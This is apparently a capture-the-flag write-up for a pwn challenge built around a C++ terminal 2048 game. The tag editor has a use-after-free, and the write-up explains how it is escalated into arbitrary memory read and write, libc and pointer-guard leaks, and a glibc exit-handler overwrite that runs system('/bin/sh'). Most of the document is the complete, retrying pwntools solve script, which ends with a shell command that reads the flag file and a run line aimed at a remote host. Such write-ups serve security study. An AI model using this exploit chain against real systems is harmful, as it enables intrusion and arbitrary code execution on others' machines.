# pwn/backtothe2048

## Overview

This is a C++ TUI 2048 game, and the bug is in the record/tag editor.

With some inspection of the code, the useful structure facts are:

- A folder contains records.
- A record contains a tag vector.
- Tag entries are walked in `0x20` byte steps in the tag-editor render path, so a tag row is effectively a 3-qword object from the exploit’s point of view.
- The tag editor keeps state for “currently editing tag”.

The vulnerability is:

- Start editing a tag.
- Mutate the tag vector so `std::vector` reallocates.
- The “editing” state is not refreshed.
- Saving the edit later writes through a dangling pointer/reference.

That gives a exploit chain:

1. Use the stale edit pointer to corrupt another tag row.
2. Turn one tag row into a reusable 24-byte arbitrary read/write primitive.
3. Leak libc through unsorted-bin metadata.
4. Leak `__exit_funcs` and recover glibc’s `pointer_guard`.
5. Overwrite an exit handler with `system("/bin/sh")`.
6. Quit cleanly and use the spawned shell to print the flag.

## Exploit Chain

### 1. Pin the exact runtime first

The exact libraries used by the final exploit came from the pinned image in `Dockerfile`. The offsets used in the solve were:

```text
libc:
  main_arena unsorted fd  : 0x203b20
  __tunable_get_val@got   : 0x202d28
  __exit_funcs            : 0x203680
  environ                 : 0x20ad58
  system                  : 0x58750
  "/bin/sh"               : 0x1cb42f

ld.so:
  __tunable_get_val       : 0x15c10
  _r_debug                : 0x39128

libstdc++:
  std::ios_base::Init dtor: 0xcf9d0
```

Must use these offset for this specific challenge setup because they change across system builds.

### 2. Find the stale-edit bug and get the first heap leak

The bug comes from the tag editor holding onto a tag being edited even after the vector holding tags is reallocated.

The first reliable sequence is:

1. Create record `a`.
2. Create record `b`.
3. Open `a`’s tags.
4. Add tag `A`.
5. Start editing tag `A`.
6. Add tag `B`.

`a.tags` originally has one element, adding `B` forces `std::vector` growth so the old tag storage is freed while the edit state still points at the old storage.

Now re-use that freed chunk with `b`:

1. Open `b`’s tags.
2. Add a 24-byte tag (`"Q" * 24`).
3. Delete it.
4. Add another 24-byte tag (`"\x00" * 24`).

Finally, go back to `a` and save the stale edit.

At that point, the save goes through the dangling edit pointer and writes into the chunk that now belongs to `b`. Reading `b`’s selected tag row gives three leaked qwords. The exploit calls the first heap pointer in that row `Q` and derives:

```text
Btag = Q + 0x80
```

`Btag` is the stable address of the tag row we use as the read/write anchor for the rest of the solve.

### 3. Turn the stale edit into a reusable 24-byte arbitrary read/write

Once `Btag` is known, the rest of the exploit reuses the same stale-edit pattern with fresh helper records.

The reusable idea is:

1. Create a fresh pair of helper records, `pXXa` and `pXXb`.
2. In `pXXa`, create the same dangling “currently editing tag” condition.
3. In `pXXb`, make the freed chunk get reused.
4. Use the stale save from `pXXa` to rewrite `pXXb`’s selected tag row.

The forged 24-byte row is treated as:

```text
[ pointer ][ size ][ capacity ]
```

That gives two very strong primitives.

Arbitrary read:

- Forge `(addr, 0x18, 0x18)` into the selected tag row.
- Re-open the tag list.
- The UI prints 24 bytes from `addr`.

Arbitrary write:

- First forge the selected tag row so the next save lands at `target`.
- Then use the stale save path one more time to write exactly 24 bytes to `target`.

### 4. Leak libc through a freed tag-vector chunk in unsorted bin

After the first write primitive is working, the exploit bootstraps a stable helper record directly after `b`. In the script that helper becomes record `c`.

The goal is to free a large `std::vector` backing store so its first qword becomes the unsorted-bin `fd` pointer.

The exact path is:

1. `c` already has two tags from the helper setup (`C` and `D`).
2. Add 62 more tags.

That makes:

```text
2 existing + 62 new = 64 total tags
```

Each tag entry is `0x20` bytes, so the backing array is:

```text
64 * 0x20 = 0x800 bytes
```

3. Add one more tag (`Y`).
4. `std::vector` reallocates.
5. The old `0x800` chunk is freed into unsorted bin.

To reach that vector, the exploit leaks the next record’s vector header at:

```text
CVEC_OFF_FROM_BTAG = 0x110
```

That offset was found empirically once the stage-1 heap leak was stable and the local heap layout could be repeated.

So the libc leak becomes:

1. Read `c.tags.begin/end/cap` from `Btag + 0x110`.
2. Save `old_begin`.
3. Trigger the reallocation with the extra tag.
4. Re-point the readable fake tag at `old_begin`.
5. Leak the first qword there.

For a freed unsorted-bin chunk, that first qword is:

```text
fd = main_arena + 0x203b20
```

So:

```text
libc_base = fd - 0x203b20
```

This is why the solve constant is:

```python
UNSORTED_MAIN_ARENA_OFF = 0x203B20
```

### 5. Leak `__exit_funcs`

With arbitrary read and a libc base, the next target is glibc’s exit-function list:

```python
EXIT_FUNCS_PTR_OFF = 0x203680
```

Reading `libc_base + 0x203680` yields the head pointer of `__exit_funcs`.

The solve then reads the first 24 bytes of that head:

```text
[ next ][ idx ][ first_flavor ]
```

`idx` tells us how many active slots are in the head block. The chosen slot is:

```text
exit_slot = exit_head + 0x10 + 0x20 * (idx - 1)
```

Reading that slot yields:

```text
[ flavor ][ encoded_function ][ arg ]
```

This is the final control target, but the function pointer is glibc-mangled, so we need `pointer_guard` first.

### 6. Recover `pointer_guard` without guessing

On modern glibc, exit-handler function pointers are mangled like this:

```python
ptr_mangle(ptr, guard)   = rol64(ptr ^ guard, 0x11)
ptr_demangle(ptr, guard) = ror64(ptr, 0x11) ^ guard
```

So to overwrite an exit handler correctly, we need the real `guard`.

The clean way used in the solve is:

1. Leak a libc GOT entry that points into `ld.so`.
2. Recover `ld` base.
3. Walk `link_map`.
4. Identify the existing encoded exit handler from `libstdc++`.
5. Use its known real address to solve for `guard`.

The exact path:

1. Read `libc + 0x202d28`, the GOT slot for `__tunable_get_val`.
2. Subtract `0x15c10` to get `ld` base.
3. Read `_r_debug` from `ld + 0x39128`.
4. Take `r_debug.r_map` to get the main `link_map`.
5. Walk `main -> vdso -> libstdc++`.
6. Read `libstdc++` base from that `link_map`.

Why libstdc++ is the right anchor:

- The binary links `libstdc++.so.6`.
- That means `std::ios_base::Init` registers a destructor through `__cxa_atexit`.
- One of the existing `__exit_funcs` slots therefore points to `std::ios_base::Init::~Init()`.

From the pinned `libstdc++.so.6.0.33`, that destructor is at:

```text
libstdcpp_base + 0xcf9d0
```

Now solve for the guard:

```python
expected = libstdcpp_base + 0xCF9D0
pointer_guard = ror64(encoded_slot, 0x11) ^ expected
```

### 7. Overwrite an exit handler with `system("/bin/sh")`

At this point we have:

- `libc_base`
- `pointer_guard`
- `exit_slot`

So the final overwrite is:

```python
payload = pack3(
    4,
    ptr_mangle(libc_base + SYSTEM_OFF, pointer_guard),
    libc_base + BINSH_OFF,
)
```

Where:

```python
SYSTEM_OFF = 0x58750
BINSH_OFF  = 0x1CB42F
```

Why flavor `4`:

- We keep the slot in the same `__cxa_atexit` style the process is already using.
- We only replace the first 24 bytes of the slot and leave the remaining dso-handle field untouched.

After that, just return to the main menu and quit.

`exit()` walks `__exit_funcs`, glibc demangles the overwritten function pointer, and the process executes:

```text
system("/bin/sh")
```

## Final Solve

```python
#!/usr/bin/env python3
from pwn import *
import os
import struct
import time


context.binary = ELF("./for_user/deploy/prob", checksec=False)
context.log_level = "info"
context.terminal = ["bash", "-lc"]

IO_DELAY = 0.02


LIBC = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6", checksec=False)

UP = b"\x1b[A"
DOWN = b"\x1b[B"

UNSORTED_MAIN_ARENA_OFF = 0x203B20
LIBC_TUNABLE_GOT_OFF = 0x202D28
EXIT_FUNCS_PTR_OFF = 0x203680
ENVIRON_OFF = 0x20AD58
SYSTEM_OFF = 0x58750
BINSH_OFF = 0x1CB42F

LD_TUNABLE_GET_VAL_OFF = 0x15C10
LD_R_DEBUG_OFF = 0x39128

CVEC_OFF_FROM_BTAG = 0x110
LIBSTDCXX_IOS_DTOR_OFF = 0xCF9D0


class BadByte(Exception):
    pass


def rol64(x, r):
    return ((x << r) & 0xFFFFFFFFFFFFFFFF) | (x >> (64 - r))


def ror64(x, r):
    return (x >> r) | ((x << (64 - r)) & 0xFFFFFFFFFFFFFFFF)


def ptr_mangle(ptr, guard):
    return rol64(ptr ^ guard, 0x11)


def ptr_demangle(ptr, guard):
    return ror64(ptr, 0x11) ^ guard


def pack3(a, b, c):
    return p64(a) + p64(b) + p64(c)


def unpack3(blob):
    return struct.unpack("<QQQ", blob[:24])


def has_bad_bytes(blob):
    return b"\n" in blob


def start(gdbscript=None, host=None, port=None, env=None, ld_path=None, lib_path=None):
    if host and port:
        return remote(host, port)
    argv = [context.binary.path]
    if ld_path:
        argv = [ld_path]
        if lib_path:
            argv += ["--library-path", lib_path]
        argv += [context.binary.path]
    if gdbscript:
        return gdb.debug(argv, gdbscript=gdbscript, env=env)
    return process(argv, env=env, stdin=PIPE, stdout=PIPE, stderr=PIPE)


def pause_brief(delay=None):
    time.sleep(IO_DELAY if delay is None else delay)


def flush(io, timeout=0.2):
    pause_brief()
    return io.clean(timeout=timeout)


def send(io, data: bytes, delay=None):
    io.send(data)
    pause_brief(delay)


def send_text(io, text: bytes):
    send(io, text + b"\n")


def hexdump_block(blob: bytes, width=16):
    lines = []
    for off in range(0, len(blob), width):
        chunk = blob[off : off + width]
        hexpart = " ".join(f"{b:02x}" for b in chunk)
        asciipart = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        lines.append(f"{off:04x}  {hexpart:<{width * 3}}  {asciipart}")
    return "\n".join(lines)


def create_record(io, name: bytes):
    send(io, b"1")
    send_text(io, name)
    send(io, b"q")
    send(io, b"m")


def goto_default_folder(io):
    send(io, b"m")
    send(io, b"3")
    send(io, b"\n")
    send(io, b"\n")


def open_tags(io):
    send(io, b"t")


def add_tag(io, value: bytes):
    send(io, b"n")
    send_text(io, value)


def edit_selected(io):
    send(io, b"e")


def save_edit(io, value: bytes):
    if has_bad_bytes(value):
        raise BadByte(f"newline in edit payload: {value.hex()}")
    send(io, b"\n")
    send(io, value + b"\n")


def delete_selected(io):
    send(io, b"d")


def back(io):
    send(io, b"b")


def down(io, n=1):
    if n > 0:
        send(io, DOWN * n)


def up(io, n=1):
    if n > 0:
        send(io, UP * n)


def pair_first_idx(pair_num):
    return 2 + pair_num * 2


def pair_names(pair_num):
    return f"p{pair_num:02d}a".encode(), f"p{pair_num:02d}b".encode()


def parse_tag_row24(blob: bytes):
    tag_pos = blob.rfind(b"TAG EDITOR")
    if tag_pos != -1:
        blob = blob[tag_pos:]
    marker = b"\xe2\x96\xba 1   "
    pos = blob.rfind(marker)
    if pos != -1 and pos + len(marker) + 24 <= len(blob):
        return blob[pos + len(marker) : pos + len(marker) + 24]
    return None


def parse_latest_tag_row24(blob: bytes):
    tag_pos = blob.rfind(b"TAG EDITOR")
    if tag_pos != -1:
        blob = blob[tag_pos:]
    marker = b"\xe2\x96\xba 1   "
    pos = blob.rfind(marker)
    if pos == -1:
        return None, False
    end = pos + len(marker) + 24
    if end <= len(blob):
        return blob[pos + len(marker) : end], True
    return None, True


def heapish(x):
    return 0x500000000000 <= x < 0x800000000000 and (x & 0xF) == 0


def find_stage1_q(blob: bytes):
    row, _ = parse_latest_tag_row24(blob)
    if row is not None:
        q0, q1, q2 = unpack3(row)
        if heapish(q0) and q1 <= 0x100 and q2 <= 0x100:
            return q0
    candidates = []
    for off in range(0, max(0, len(blob) - 24)):
        q0, q1, q2 = unpack3(blob[off : off + 24])
        if heapish(q0) and q1 <= 0x100 and q2 <= 0x100:
            candidates.append((off, q0, q1, q2))
    if not candidates:
        raise RuntimeError("failed to find stage1 heap leak")
    return candidates[-1][1]


class Solver:
    def __init__(self, io):
        self.io = io
        self.next_pair = 0
        self.btag = None
        self.libc_base = None
        self.ld_base = None
        self.main_map = None
        self.pointer_guard = None
        self.exit_head = None
        self.exit_slot = None
        self.exit_idx = None
        self.guard_slot = None
        self.guard_slot_enc = None
        self.exit_slot_flavor = None
        self.exit_slot_enc = None
        self.exit_slot_arg = None

    def alloc_pair(self):
        pair = self.next_pair
        self.next_pair += 1
        return pair

    def stage1_heap_leak(self):
        create_record(self.io, b"a")
        create_record(self.io, b"b")
        goto_default_folder(self.io)
        flush(self.io)

        open_tags(self.io)
        add_tag(self.io, b"A")
        edit_selected(self.io)
        add_tag(self.io, b"B")
        back(self.io)

        down(self.io)
        open_tags(self.io)
        add_tag(self.io, b"Q" * 24)
        delete_selected(self.io)
        add_tag(self.io, b"\x00" * 24)
        back(self.io)

        up(self.io)
        open_tags(self.io)
        save_edit(self.io, b"K")
        back(self.io)

        down(self.io)
        open_tags(self.io)
        screen = b""
        deadline = time.time() + 3.0
        q = None
        while time.time() < deadline:
            screen += self.io.clean(timeout=0.15)
            try:
                q = find_stage1_q(screen)
                break
            except Exception:
                continue
        if q is None:
            raise RuntimeError(
                "failed to find stage1 heap leak\n"
                + hexdump_block(screen[-512:] if screen else b"")
            )
        self.btag = q + 0x80
        info(f"stage1 Q = {q:#x}")
        info(f"Btag = {self.btag:#x}")

    def setup_pair_from_b(self, pair_num):
        back(self.io)
        back(self.io)
        back(self.io)
        left, right = pair_names(pair_num)
        create_record(self.io, left)
        create_record(self.io, right)
        goto_default_folder(self.io)
        flush(self.io)

        left_idx = pair_first_idx(pair_num)
        down(self.io, left_idx)

        open_tags(self.io)
        add_tag(self.io, b"C")
        edit_selected(self.io)
        add_tag(self.io, b"D")
        back(self.io)

        down(self.io)
        open_tags(self.io)
        add_tag(self.io, b"R" * 24)
        delete_selected(self.io)
        add_tag(self.io, b"S" * 24)

    def write24_from_b(self, target, data24, pair_num=None):
        if len(data24) != 24:
            raise ValueError("write24_from_b expects exactly 24 bytes")
        carrier = pack3(target, 0, 0x20)
        if has_bad_bytes(carrier):
            raise BadByte(f"newline in carrier target {target:#x}")
        if has_bad_bytes(data24):
            raise BadByte(f"newline in 24-byte write payload {data24.hex()}")

        if pair_num is None:
            pair_num = self.alloc_pair()

        self.setup_pair_from_b(pair_num)
        edit_selected(self.io)
        save_edit(self.io, carrier)
        back(self.io)
        up(self.io)
        open_tags(self.io)
        save_edit(self.io, data24)
        back(self.io)
        up(self.io, pair_first_idx(pair_num) - 1)
        open_tags(self.io)
        return pair_num

    def prepare_pair_from_b(self, target, pair_num=None):
        carrier = pack3(target, 0, 0x20)
        if has_bad_bytes(carrier):
            raise BadByte(f"newline in prepared carrier target {target:#x}")
        if pair_num is None:
            pair_num = self.alloc_pair()

        self.setup_pair_from_b(pair_num)
        edit_selected(self.io)
        save_edit(self.io, carrier)
        back(self.io)
        up(self.io, pair_first_idx(pair_num))
        open_tags(self.io)
        return pair_num

    def fire_prepared_from_b(self, pair_num, data24):
        if len(data24) != 24:
            raise ValueError("fire_prepared_from_b expects exactly 24 bytes")
        if has_bad_bytes(data24):
            raise BadByte(f"newline in prepared payload {data24.hex()}")
        back(self.io)
        down(self.io, pair_first_idx(pair_num) - 1)
        open_tags(self.io)
        save_edit(self.io, data24)
        back(self.io)
        up(self.io, pair_first_idx(pair_num) - 1)
        open_tags(self.io)

    def bootstrap_b_anchor(self):
        pair = self.alloc_pair()
        self.write24_from_b(self.btag, pack3(self.btag, 0x18, 0x18), pair)
        row = parse_tag_row24(flush(self.io, 0.4))
        if row is None:
            raise RuntimeError("failed to bootstrap b anchor")
        info("b anchor bootstrapped")

    def goto_c_tags_from_b(self):
        back(self.io)
        down(self.io, 1)
        open_tags(self.io)

    def return_b_from_c(self):
        back(self.io)
        up(self.io, 1)
        open_tags(self.io)

    def read_exact(self, addr, size=24):
        if not (1 <= size <= 24):
            raise ValueError("size must be between 1 and 24")
        max_shift = 24 - size
        for shift in range(max_shift + 1):
            base = addr - shift
            payload = pack3(base, 0x18, 0x18)
            if has_bad_bytes(payload):
                continue
            pair = self.alloc_pair()
            self.write24_from_b(self.btag, payload, pair)
            screen = b""
            deadline = time.time() + 3.0
            row = None
            last_row_at = None
            while time.time() < deadline:
                chunk = self.io.clean(timeout=0.15)
                if chunk:
                    screen += chunk
                row, saw_marker = parse_latest_tag_row24(screen)
                if row is not None:
                    last_row_at = time.time()
                if row is not None and last_row_at is not None and time.time() - last_row_at >= 0.35:
                    break
                if saw_marker:
                    continue
            if row is None or len(row) != 24:
                tail = screen[-512:]
                raise RuntimeError(
                    f"failed to parse b-row leak @ {addr:#x} size {size} shift {shift}\n{hexdump_block(tail)}"
                )
            out = row[shift : shift + size]
            flush(self.io, 0.1)
            return out
        raise BadByte(f"no newline-safe base for read at {addr:#x} size {size}")

    def read_qword(self, addr):
        return u64(self.read_exact(addr, 8))

    def read_triplet(self, addr):
        chunk = self.read_exact(addr, 24)
        return unpack3(chunk)

    def leak_libc(self):
        self.goto_c_tags_from_b()
        for _ in range(62):
            add_tag(self.io, b"X")
        self.return_b_from_c()

        old_begin, old_end, old_cap = self.read_triplet(self.btag + CVEC_OFF_FROM_BTAG)
        info(f"c vec begin/end/cap = {old_begin:#x} {old_end:#x} {old_cap:#x}")

        prepared = self.prepare_pair_from_b(self.btag)
        self.goto_c_tags_from_b()
        add_tag(self.io, b"Y")
        self.return_b_from_c()

        self.fire_prepared_from_b(prepared, pack3(old_begin, 0x18, 0x18))
        row = parse_tag_row24(flush(self.io, 0.4))
        if row is None:
            raise RuntimeError("failed to parse unsorted-bin leak row")
        fd = u64(row[:8])
        self.libc_base = fd - UNSORTED_MAIN_ARENA_OFF
        info(f"unsorted fd = {fd:#x}")
        info(f"libc base = {self.libc_base:#x}")

    def leak_ld_and_link_map(self):
        ld_ptr = self.read_qword(self.libc_base + LIBC_TUNABLE_GOT_OFF)
        self.ld_base = ld_ptr - LD_TUNABLE_GET_VAL_OFF
        info(f"ld base = {self.ld_base:#x}")
        r_debug = self.read_triplet(self.ld_base + LD_R_DEBUG_OFF)
        self.main_map = r_debug[1]
        info(f"main link_map = {self.main_map:#x}")

    def prepare_exit_slot(self):
        info("leaking __exit_funcs pointer")
        self.exit_head = self.read_qword(self.libc_base + EXIT_FUNCS_PTR_OFF)
        info("leaking __exit_funcs head triplet")
        next_ptr, idx, first_flavor = self.read_triplet(self.exit_head)
        info(f"__exit_funcs head = {self.exit_head:#x}")
        info(f"exit list next/idx/first_flavor = {next_ptr:#x} {idx:#x} {first_flavor:#x}")
        if idx == 0:
            raise RuntimeError("exit function list is empty")
        self.exit_idx = idx
        self.guard_slot = self.exit_head + 0x10
        _, self.guard_slot_enc, _ = self.read_triplet(self.guard_slot)
        self.exit_slot = self.exit_head + 0x10 + 0x20 * (idx - 1)
        self.exit_slot_flavor, self.exit_slot_enc, self.exit_slot_arg = self.read_triplet(self.exit_slot)
        info(f"chosen exit slot = {self.exit_slot:#x}")
        info(
            f"current exit slot flavor/enc/arg = "
            f"{self.exit_slot_flavor:#x} {self.exit_slot_enc:#x} {self.exit_slot_arg:#x}"
        )

    def recover_pointer_guard(self):
        ld_ptr = self.read_qword(self.libc_base + LIBC_TUNABLE_GOT_OFF)
        self.ld_base = ld_ptr - LD_TUNABLE_GET_VAL_OFF
        info(f"ld base = {self.ld_base:#x}")

        r_debug = self.read_triplet(self.ld_base + LD_R_DEBUG_OFF)
        self.main_map = r_debug[1]
        info(f"main link_map = {self.main_map:#x}")

        vdso_map = self.read_qword(self.main_map + 0x18)
        libstdcpp_map = self.read_qword(vdso_map + 0x18)
        libstdcpp_base = self.read_qword(libstdcpp_map)
        info(f"libstdc++ base = {libstdcpp_base:#x}")

        expected = libstdcpp_base + LIBSTDCXX_IOS_DTOR_OFF
        self.pointer_guard = ror64(self.guard_slot_enc, 0x11) ^ expected
        decoded = ptr_demangle(self.guard_slot_enc, self.pointer_guard)
        info(f"recovered pointer_guard = {self.pointer_guard:#x}")
        info(f"demangled guard slot fn = {decoded:#x}")
        if decoded != expected:
            raise RuntimeError("pointer_guard recovery from libstdc++ destructor failed")

    def leak_pointer_guard(self):
        envp = self.read_qword(self.libc_base + ENVIRON_OFF)
        info(f"environ = {envp:#x}")

        qwords = []
        null_idx = None
        rand_ptr = None
        for i in range(48):
            base = envp + i * 0x18
            chunk = self.read_exact(base, 24)
            qwords.extend(unpack3(chunk))
            if null_idx is None:
                for j, q in enumerate(qwords):
                    if q == 0:
                        null_idx = j
                        break
            if null_idx is not None:
                for j in range(null_idx + 1, len(qwords) - 1, 2):
                    if qwords[j] == 25:
                        rand_ptr = qwords[j + 1]
                        break
            if rand_ptr is not None:
                break

        if rand_ptr is None:
            raise RuntimeError("failed to locate AT_RANDOM in leaked auxv")

        flush(self.io, 0.5)
        pause_brief(0.1)
        q0 = q1 = decoded = None
        for _ in range(6):
            random_blob = self.read_exact(rand_ptr, 16)
            q0 = u64(random_blob[:8])
            q1 = u64(random_blob[8:16])
            decoded = None
            if self.exit_slot_enc is not None:
                decoded = ptr_demangle(self.exit_slot_enc, q1)
            if q0 != rand_ptr and q1 > 0x1000 and (decoded is None or heapish(decoded)):
                self.pointer_guard = q1
                break
            warning(
                f"suspicious AT_RANDOM read q0={q0:#x} q1={q1:#x}"
                + ("" if decoded is None else f" decoded={decoded:#x}")
            )
            flush(self.io, 0.4)
            pause_brief(0.1)
        if self.pointer_guard is None:
            raise RuntimeError("failed to derive a sane pointer_guard")

        info(f"AT_RANDOM = {rand_ptr:#x}")
        info(f"AT_RANDOM q0 = {q0:#x}")
        info(f"pointer_guard = {self.pointer_guard:#x}")
        if self.exit_slot_enc is not None:
            info(f"demangled chosen exit fn = {ptr_demangle(self.exit_slot_enc, self.pointer_guard):#x}")

    def overwrite_exit_handler(self):
        if self.exit_slot is None:
            raise RuntimeError("exit slot not prepared")
        payload = pack3(
            4,
            ptr_mangle(self.libc_base + SYSTEM_OFF, self.pointer_guard),
            self.libc_base + BINSH_OFF,
        )
        self.write24_from_b(self.exit_slot, payload)
        info("exit handler overwritten with system('/bin/sh')")

    def trigger_shell(self):
        back(self.io)
        back(self.io)
        back(self.io)
        send(self.io, b"q")
        time.sleep(0.3)

        cmd = b"echo PWNED; cat flag || cat /home/user2048/flag || cat for_user/deploy/flag; echo DONE; exit\n"
        self.io.send(cmd)
        time.sleep(0.2)
        return self.io.recvrepeat(1.5)

    def solve(self):
        self.stage1_heap_leak()
        self.bootstrap_b_anchor()
        self.leak_libc()
        self.prepare_exit_slot()
        self.recover_pointer_guard()
        self.overwrite_exit_handler()
        return self.trigger_shell()


def solve_once(args):
    env = os.environ.copy()
    if args.preload:
        env["LD_PRELOAD"] = args.preload

    gdbscript = None
    if args.gdb:
        gdbscript = """
set pagination off
set disassembly-flavor intel
"""

    io = start(
        gdbscript=gdbscript,
        host=args.host,
        port=args.port,
        env=env,
        ld_path=args.ld_path,
        lib_path=args.lib_path,
    )
    try:
        solver = Solver(io)
        return solver.solve()
    finally:
        try:
            io.close()
        except Exception:
            pass


def main():
    import argparse

    global IO_DELAY

    ap = argparse.ArgumentParser()
    ap.add_argument("--host")
    ap.add_argument("--port", type=int)
    ap.add_argument("--gdb", action="store_true")
    ap.add_argument("--preload")
    ap.add_argument("--ld-path")
    ap.add_argument("--lib-path")
    ap.add_argument("--delay", type=float, default=0.02)
    ap.add_argument("--attempts", type=int, default=25)
    ap.add_argument("--log-level", default="info")
    args = ap.parse_args()

    context.log_level = args.log_level
    IO_DELAY = args.delay

    for attempt in range(1, args.attempts + 1):
        try:
            info(f"attempt {attempt}/{args.attempts}")
            output = solve_once(args)
            print(output.decode("latin-1", errors="replace"))
            return
        except BadByte as exc:
            warning(f"retrying after bad byte: {exc}")
        except EOFError:
            warning("EOF during exploit, retrying")
        except Exception as exc:
            warning(f"attempt failed: {exc}")

    raise SystemExit("all attempts failed")


if __name__ == "__main__":
    main()
```

Run it like this:

```sh
python3 solve.py --host 15.165.9.127 --port 36202 --delay 0.12 --attempts 1
```